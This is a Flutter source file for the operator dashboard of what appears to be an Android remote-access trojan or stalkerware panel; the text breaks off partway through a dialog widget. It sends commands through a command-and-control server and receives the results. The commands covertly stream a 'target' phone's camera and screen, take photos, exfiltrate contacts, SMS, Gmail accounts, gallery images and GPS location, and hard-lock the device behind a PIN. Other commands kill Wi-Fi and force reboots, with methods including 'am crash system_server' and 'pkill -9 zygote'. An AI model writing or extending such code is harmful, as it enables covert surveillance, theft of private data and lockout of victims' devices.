import 'config_service.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'theme_provider.dart';

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Tab Dashboard (SxC V12 PREMIUM EDITION)
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // ── Animations ────────────────────────────────────────────────────────────
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;
  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    
    // Premium Animations
    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 600),
      vsync: this,
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeInOut,
    );
    _fadeController.forward();
    
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );
    _pulseAnimation = Tween<double>(begin: 1.0, end: 1.02).animate(
      CurvedAnimation(
        parent: _pulseController,
        curve: Curves.easeInOut,
      ),
    );
    _pulseController.repeat(reverse: true);
    
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    _fadeController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color? c}) {
    if (!mounted) return;
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: (c ?? theme.accentColor).withOpacity(0.9),
      content: Text(m, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('${ConfigService.baseUrl}/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Command sent', c: Colors.green);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Connection failed'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('${ConfigService.baseUrl}/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('No photo'); return; }
        _addLog('Photo received');
        _imgDialog(b, 'Target Photo');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot received');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS received');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} contacts');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Accounts received');
        _textDialog('Accounts & Emails', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} gallery photos');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd completed');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'FRONT CAMERA' : 'BACK CAMERA')
          : 'SCREEN STREAM';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('${ConfigService.baseUrl}/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live stopped');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('${ConfigService.baseUrl}/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('${ConfigService.baseUrl}/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final theme = Provider.of<ThemeProvider>(context);
    
    return FadeTransition(
      opacity: _fadeAnimation,
      child: Scaffold(
        backgroundColor: theme.backgroundColor,
        appBar: AppBar(
          backgroundColor: Colors.transparent,
          elevation: 0,
          leading: Container(
            margin: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: theme.primaryColor.withOpacity(0.2), width: 1),
            ),
            child: IconButton(
              icon: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
              onPressed: () { if (_liveOn) _stopLive(); Navigator.pop(context); }
            ),
          ),
          title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(_model, style: TextStyle(color: theme.textPrimaryColor, fontSize: 16, fontWeight: FontWeight.w700, letterSpacing: 0.5)),
            const SizedBox(height: 2),
            Row(children: [
              AnimatedContainer(
                duration: const Duration(milliseconds: 500),
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  color: _liveOn ? theme.accentColor : (_sending ? Colors.amber : Colors.green),
                  shape: BoxShape.circle,
                  boxShadow: [BoxShadow(color: (_liveOn ? theme.accentColor : Colors.green).withOpacity(0.5), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 6),
              Text('Battery: $_battery%  •  $_id',
                  style: TextStyle(color: theme.textSecondaryColor, fontSize: 9), overflow: TextOverflow.ellipsis),
            ]),
          ]),
          actions: [
            if (_liveOn) Container(
              margin: const EdgeInsets.symmetric(vertical: 12, horizontal: 4),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: theme.accentColor.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: theme.accentColor.withOpacity(0.5)),
              ),
              child: Row(mainAxisSize: MainAxisSize.min, children: [
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _pulseAnimation.value,
                      child: Container(width: 6, height: 6, decoration: BoxDecoration(color: theme.accentColor, shape: BoxShape.circle)),
                    );
                  },
                ),
                const SizedBox(width: 6),
                Text('$_fps fps', style: TextStyle(color: theme.accentColor, fontSize: 11, fontWeight: FontWeight.bold)),
              ]),
            ),
            if (_sending) const Padding(padding: EdgeInsets.only(right: 12),
              child: Center(child: SizedBox(width: 16, height: 16,
                  child: CircularProgressIndicator(strokeWidth: 2)))),
            Container(
              margin: const EdgeInsets.only(right: 8),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: theme.primaryColor.withOpacity(0.2), width: 1),
              ),
              child: IconButton(
                icon: Icon(Icons.refresh_rounded, color: theme.textSecondaryColor, size: 18),
                onPressed: () { setState(() {}); _cmd('force_open', silent: true); }
              ),
            ),
          ],
          bottom: PreferredSize(
            preferredSize: const Size.fromHeight(48),
            child: Container(
              margin: const EdgeInsets.symmetric(horizontal: 12),
              child: TabBar(
                controller: _tabs,
                isScrollable: true,
                indicator: UnderlineTabIndicator(
                  borderSide: BorderSide(color: theme.primaryColor, width: 2.5),
                  insets: const EdgeInsets.symmetric(horizontal: 8),
                ),
                labelColor: theme.primaryColor,
                unselectedLabelColor: theme.textSecondaryColor,
                labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.w700, letterSpacing: 0.5),
                unselectedLabelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.w500),
                tabs: const [
                  Tab(text: 'Live Stream'),
                  Tab(text: 'Camera'),
                  Tab(text: 'Intel'),
                  Tab(text: 'Audio'),
                  Tab(text: 'Lock blanks'),
                  Tab(text: 'Device'),
                ],
              ),
            ),
          ),
        ),
        body: Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.topLeft,
              radius: 1.5,
              colors: [theme.primaryColor.withOpacity(0.15), theme.backgroundColor, theme.backgroundColor],
              stops: const [0.0, 0.4, 1.0],
            ),
          ),
          child: Column(children: [
            // Log Panel
            Container(
              height: 52,
              margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
              padding: const EdgeInsets.fromLTRB(12, 6, 12, 6),
              decoration: BoxDecoration(
                color: theme.glassPrimary,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: theme.primaryColor.withOpacity(0.2), width: 0.5),
                boxShadow: [BoxShadow(color: theme.primaryColor.withOpacity(0.2), blurRadius: 8)],
              ),
              child: _log.isEmpty
                  ? Center(child: Text('Ready for commands', style: TextStyle(color: theme.textSecondaryColor, fontSize: 10, letterSpacing: 0.5)))
                  : ListView.builder(
                      itemCount: _log.length,
                      itemBuilder: (_, i) => Text(
                        _log[i],
                        style: TextStyle(color: theme.primaryColor, fontSize: 9, fontFamily: 'monospace'),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
            ),
            Expanded(child: TabBarView(controller: _tabs, children: [
              _pageLive(theme),
              _pageCamera(theme),
              _pageIntel(theme),
              _pageAudio(theme),
              _pageLock(theme),
              _pageDevice(theme),
            ])),
          ]),
        ),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LIVE STREAM (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLive(ThemeProvider theme) => ListView(padding: const EdgeInsets.all(16), children: [
    _header(theme, 'LIVE STREAM', 'Real-time camera & screen from target device'),
    const SizedBox(height: 16),
    AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      height: _liveOn ? 240 : 100,
      decoration: BoxDecoration(
        color: const Color(0xFF020210),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _liveOn ? theme.accentColor.withOpacity(0.6) : theme.primaryColor.withOpacity(0.2), width: 1.5),
        boxShadow: _liveOn ? [BoxShadow(color: theme.accentColor.withOpacity(0.2), blurRadius: 20)] : [],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(19),
        child: _liveOn && _frame != null
            ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
            : Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.videocam_off_rounded, color: theme.textSecondaryColor, size: 32),
                    const SizedBox(height: 8),
                    Text(_liveOn ? 'Waiting for frames...' : 'Stream inactive',
                        style: TextStyle(color: theme.textSecondaryColor, fontSize: 11)),
                  ],
                ),
              ),
      ),
    ),
    const SizedBox(height: 20),
    _neonDualBtn(theme,
      leftLabel: 'CAMERA',
      leftIcon: Icons.videocam_rounded,
      leftColor: theme.accentColor,
      leftFn: () { _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(theme); }); },
      rightLabel: 'SCREEN',
      rightIcon: Icons.desktop_windows_rounded,
      rightColor: theme.primaryColor,
      rightFn: () { _startLive('live_screen_start', ''); _showLiveDialog(theme); },
    ),
    if (_liveOn) ...[
      const SizedBox(height: 12),
      _neonSingleBtn(theme, 'STOP LIVE', Icons.stop_circle_outlined, theme.accentColor, _stopLive, isDestructive: true),
    ],
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: CAMERA (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageCamera(ThemeProvider theme) => ListView(padding: const EdgeInsets.all(16), children: [
    _header(theme, 'CAMERA & VISUAL', 'Capture photos, screenshots, and control display'),
    const SizedBox(height: 16),
    _neonSingleBtn(theme, 'TAKE PHOTO', Icons.camera_alt_rounded, theme.accentColor, () {
      _showCamPicker((s) => _cmd('take_photo', extra: s));
    }),
    _gap,
    _neonSingleBtn(theme, 'SCREENSHOT', Icons.screenshot_monitor, theme.primaryColor, () => _cmd('get_screen')),
    _gap,
    _neonSingleBtn(theme, 'SET WALLPAPER', Icons.wallpaper_rounded, const Color(0xFFD946EF), () {
      _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v));
    }),
    _gap,
    _neonDualBtn(theme,
      leftLabel: 'STROBE ON',
      leftIcon: Icons.flash_on_rounded,
      leftColor: const Color(0xFFFF6B35),
      leftFn: () => _cmd('flash_strobe'),
      rightLabel: 'STROBE OFF',
      rightIcon: Icons.flash_off_rounded,
      rightColor: theme.textSecondaryColor,
      rightFn: () => _cmd('stop_strobe'),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: INTELLIGENCE (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageIntel(ThemeProvider theme) => ListView(padding: const EdgeInsets.all(16), children: [
    _header(theme, 'INTELLIGENCE', 'Extract data and information from target device'),
    const SizedBox(height: 16),
    _neonSingleBtn(theme, 'CONTACTS', Icons.contacts_rounded, theme.accentColor, () => _cmd('get_contacts')),
    _gap,
    _neonSingleBtn(theme, 'GPS LOCATION', Icons.my_location_rounded, Colors.green, () => _cmd('get_location')),
    _gap,
    _neonSingleBtn(theme, 'GMAIL & ACCOUNTS', Icons.account_circle_rounded, theme.primaryColor, () => _cmd('get_gmails')),
    _gap,
    _neonSingleBtn(theme, 'SMS INBOX', Icons.sms_rounded, const Color(0xFF00E5FF), () => _cmd('get_sms')),
    _gap,
    _neonSingleBtn(theme, 'NOTIFICATIONS', Icons.notifications_rounded, const Color(0xFFD946EF), () => _fetchNotif(theme)),
    _gap,
    _neonSingleBtn(theme, 'GALLERY (5 PHOTOS)', Icons.photo_library_rounded, const Color(0xFFFFD700), () => _cmd('get_gallery', extra: '5')),
    _gap,
    _neonSingleBtn(theme, 'REQUEST NOTIF ACCESS', Icons.security_rounded, theme.textSecondaryColor, () => _cmd('open_notification_settings')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: AUDIO (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageAudio(ThemeProvider theme) => ListView(padding: const EdgeInsets.all(16), children: [
    _header(theme, 'AUDIO & NETWORK', 'Control audio and network on target device'),
    const SizedBox(height: 16),
    _neonSingleBtn(theme, 'PLAY AUDIO', Icons.play_circle_rounded, const Color(0xFFFF6B35), () {
      _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v));
    }),
    _gap,
    _neonSingleBtn(theme, 'STOP AUDIO', Icons.stop_circle_rounded, theme.textSecondaryColor, () => _cmd('stop_audio')),
    _gap,
    _neonSingleBtn(theme, 'VIBRATE LOOP', Icons.vibration_rounded, const Color(0xFFD946EF), () => _cmd('vibrate_loop')),
    _gap,
    _neonSingleBtn(theme, 'OPEN URL', Icons.open_in_browser, theme.primaryColor, () {
      _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v));
    }),
    _gap,
    _neonSingleBtn(theme, 'KILL WIFI', Icons.wifi_off_rounded, const Color(0xFF00E5FF), () => _cmd('kill_wifi')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LOCK & CHAT (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLock(ThemeProvider theme) => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(16), children: [
      _header(theme, 'REMOTE BLANK', ' make the target screen black freeze'),
      const SizedBox(height: 16),

      _neonSingleBtn(theme, 'LOCK BLANK SCREEN', Icons.lock_rounded, theme.accentColor, () => _lockLiveDialog(theme), isDestructive: true),
      _gap,
      _neonSingleBtn(theme, 'BLACK SCREEN', Icons.lock_outline_rounded, theme.primaryColor, () => _lockChatDialog(theme)),
      _gap,
      _neonSingleBtn(theme, 'HARD LOCK DEVICE', Icons.lock_clock_rounded, const Color(0xFFFF6B35), () {
        _inputDialog('Lock Device', 'Message on lock screen', (msg) {
          _inputDialog('PIN Unlock', '4-digit PIN', (pin) {
            _cmd('hard_lock', extra: '$msg|$pin');
          }, isNumber: true, hint: '1234');
        });
      }),
      _gap,
      _neonSingleBtn(theme, 'UNLOCK DEVICE', Icons.lock_open_rounded, Colors.green, () => _cmd('unlock')),
      const SizedBox(height: 24),

      _header(theme, 'CHAT WITH TARGET', 'Messages appear on target\'s lock screen "useless" '),
      const SizedBox(height: 12),
      Container(
        height: 220,
        decoration: BoxDecoration(
          color: theme.glassPrimary,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: theme.primaryColor.withOpacity(0.2), width: 0.5),
        ),
        child: _chat.isEmpty
            ? Center(child: Text('No messages yet', style: TextStyle(color: theme.textSecondaryColor, fontSize: 12)))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.all(12),
                itemCount: _chat.length,
                itemBuilder: (_, i) {
                  final m = _chat[i];
                  final isOwner = m['from'] == 'owner';
                  return TweenAnimationBuilder(
                    tween: Tween<double>(begin: 0.5, end: 1),
                    duration: Duration(milliseconds: 200 + (i * 20)),
                    curve: Curves.easeOutBack,
                    builder: (context, scale, child) {
                      return Transform.scale(scale: scale, child: child);
                    },
                    child: Align(
                      alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                      child: Container(
                        margin: const EdgeInsets.symmetric(vertical: 3),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                        constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: isOwner 
                                ? [theme.accentColor.withOpacity(0.8), theme.primaryColor.withOpacity(0.6)] 
                                : [theme.glassPrimary, theme.glassPrimary.withOpacity(0.8)],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight
                          ),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: isOwner ? theme.primaryColor.withOpacity(0.4) : theme.primaryColor.withOpacity(0.2), width: 0.5),
                          boxShadow: isOwner ? [BoxShadow(color: theme.primaryColor.withOpacity(0.2), blurRadius: 8)] : [],
                        ),
                        child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                          Text(m['text'] ?? '', style: TextStyle(color: theme.textPrimaryColor, fontSize: 13, fontWeight: FontWeight.w500)),
                          const SizedBox(height: 4),
                          Text(m['time'] ?? '', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                        ]),
                      ),
                    ),
                  );
                },
              ),
      ),
    ])),
    Container(
      padding: const EdgeInsets.fromLTRB(14, 10, 14, 14),
      decoration: BoxDecoration(
        color: theme.glassPrimary,
        border: Border(top: BorderSide(color: theme.primaryColor.withOpacity(0.2), width: 1)),
      ),
      child: Row(children: [
        Expanded(child: TextField(
          controller: _chatCtrl,
          style: TextStyle(color: theme.textPrimaryColor, fontSize: 14),
          decoration: InputDecoration(
            hintText: 'Type message to target...',
            hintStyle: TextStyle(color: theme.textSecondaryColor, fontSize: 12),
            filled: true,
            fillColor: theme.backgroundColor,
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(28),
              borderSide: BorderSide.none,
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(28),
              borderSide: BorderSide(color: theme.primaryColor, width: 1.5),
            ),
          ),
          onSubmitted: _sendChat,
        )),
        const SizedBox(width: 10),
        AnimatedBuilder(
          animation: _pulseAnimation,
          builder: (context, child) {
            return Transform.scale(
              scale: _pulseAnimation.value,
              child: GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [theme.accentColor, theme.primaryColor], begin: Alignment.topLeft, end: Alignment.bottomRight),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(color: theme.primaryColor.withOpacity(0.4), blurRadius: 12),
                      BoxShadow(color: theme.accentColor.withOpacity(0.4), blurRadius: 12),
                    ],
                  ),
                  child: const Icon(Icons.send_rounded, color: Colors.white, size: 18),
                ),
              ),
            );
          },
        ),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: DEVICE (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageDevice(ThemeProvider theme) => ListView(padding: const EdgeInsets.all(16), children: [
    _header(theme, 'DEVICE CONTROL', 'Full system control over target device'),
    const SizedBox(height: 16),
    _neonSingleBtn(theme, 'RESTART DEVICE', Icons.restart_alt_rounded, const Color(0xFFFF6B35), () {
      showDialog(context: context, builder: (_) => AlertDialog(
        backgroundColor: theme.glassPrimary,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: const Color(0xFFFF6B35).withOpacity(0.5))),
        title: Text('Restart Device', style: TextStyle(color: theme.textPrimaryColor, fontSize: 15, fontWeight: FontWeight.bold)),
        content: Text(
          'The target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
          style: TextStyle(color: theme.textSecondaryColor, fontSize: 13, height: 1.5)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: theme.textSecondaryColor))),
          Container(
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [Color(0xFFFF6B35), Color(0xFFE65100)]),
              borderRadius: BorderRadius.circular(10),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
              onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
              child: const Text('RESTART', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ));
    }),
    _gap,
    _neonSingleBtn(theme, 'WAKE UP TARGET', Icons.wb_sunny_rounded, Colors.green, () => _cmd('force_open')),
    const SizedBox(height: 24),
    Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [theme.glassPrimary, theme.glassPrimary.withOpacity(0.5)], begin: Alignment.topLeft, end: Alignment.bottomRight),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: theme.primaryColor.withOpacity(0.2), width: 0.5),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text('RESTART METHODS', style: TextStyle(color: theme.textPrimaryColor, fontSize: 12, fontWeight: FontWeight.w700, letterSpacing: 1)),
        const SizedBox(height: 12),
        _infoRow(theme, '1', 'PowerManager reflection (no root required)', const Color(0xFFFF6B35)),
        _infoRow(theme, '2', 'DevicePolicyManager (if admin active)', theme.primaryColor),
        _infoRow(theme, '3', 'su -c reboot (root)', theme.accentColor),
        _infoRow(theme, '4', 'am crash system_server', const Color(0xFFD946EF)),
        _infoRow(theme, '5', 'pkill -9 zygote', theme.textSecondaryColor),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // DIALOGS
  // ─────────────────────────────────────────────────────────────────────────
  void _showLiveDialog(ThemeProvider theme) {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: theme.backgroundColor,
          insetPadding: const EdgeInsets.all(8),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: theme.accentColor.withOpacity(0.6), width: 2),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [theme.glassPrimary, theme.glassPrimary.withOpacity(0.8)]),
                borderRadius: const BorderRadius.vertical(top: Radius.circular(18)),
                border: Border(bottom: BorderSide(color: theme.primaryColor.withOpacity(0.2))),
              ),
              child: Row(children: [
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _pulseAnimation.value,
                      child: Container(
                        width: 10,
                        height: 10,
                        decoration: BoxDecoration(
                          color: theme.accentColor,
                          shape: BoxShape.circle,
                          boxShadow: [BoxShadow(color: theme.accentColor, blurRadius: 10)],
                        ),
                      ),
                    );
                  },
                ),
                const SizedBox(width: 12),
                Text('LIVE — $_liveTitle', style: TextStyle(color: theme.textPrimaryColor, fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 0.5)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                  decoration: BoxDecoration(
                    color: Colors.green.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: Colors.green.withOpacity(0.4)),
                  ),
                  child: Text('$_fps fps', style: const TextStyle(color: Colors.green, fontSize: 10, fontWeight: FontWeight.bold)),
                ),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.55),
